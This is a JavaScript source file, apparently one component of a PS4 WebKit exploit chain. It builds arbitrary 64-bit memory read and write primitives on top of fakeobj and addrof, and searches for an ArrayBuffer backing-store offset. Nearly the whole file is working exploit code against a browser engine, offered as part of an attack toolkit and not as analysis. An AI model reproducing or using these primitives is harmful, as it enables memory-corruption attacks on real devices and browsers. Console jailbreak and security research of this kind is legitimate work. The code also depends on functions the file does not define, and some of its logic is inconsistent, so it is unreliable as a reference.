// mem.js
// Memory read/write primitives for PS4 WebKit exploit

let initialized = false;
let BS_OFFSET, buf, dv, bsPtrAddr;

function read64(addr) {
    if (!initialized) throw new Error('mem.js not initialized');
    // Point backing store to target address
    const fake = fakeobj(bsPtrAddr);
    fake[0] = BigInt(addr);
    return dv.getBigUint64(0, true);
}

function write64(addr, value) {
    if (!initialized) throw new Error('mem.js not initialized');
    // Point backing store to target address
    const fake = fakeobj(bsPtrAddr);
    fake[0] = BigInt(addr);
    dv.setBigUint64(0, BigInt(value), true);
}


/**
 * Initialize memory primitives by finding the backing store offset and setting up DataView
 */
async function initMemory(log) {
    initialized = true;
    
    for (let i = 0; i < 0x100; i++) {
        log('testing...');
        if (i % 8 === 0) {
            log(`finding backing store: ${i}/256`);
        }

        BS_OFFSET = await findBackingStoreOffset_adv(log, i);
        buf = new ArrayBuffer(0x100);
        dv = new DataView(buf);

        // Check if we can read/write to the backing store
        var obj = fakeobj(BigInt(0x100000000n) + BigInt(BS_OFFSET));
        bsPtrAddr = addrof(obj);

        // Test read/write
        var test = fakeobj(0x1000n);
        console.log(read64(addrof(test)).toString(16));
        write64(addrof(test), 0x41414141n);
        console.log(read64(addrof(test)).toString(16));

        if (read64(addrof(test)) === 0x41414141n) {
            log(`Backing store offset found: 0x${BS_OFFSET.toString(16)}`);
            return;
        }
    }

    console.log("we were unable to find the backing store offset, this is likely due to a bug in the exploit or a change in the PS4 firmware.");
}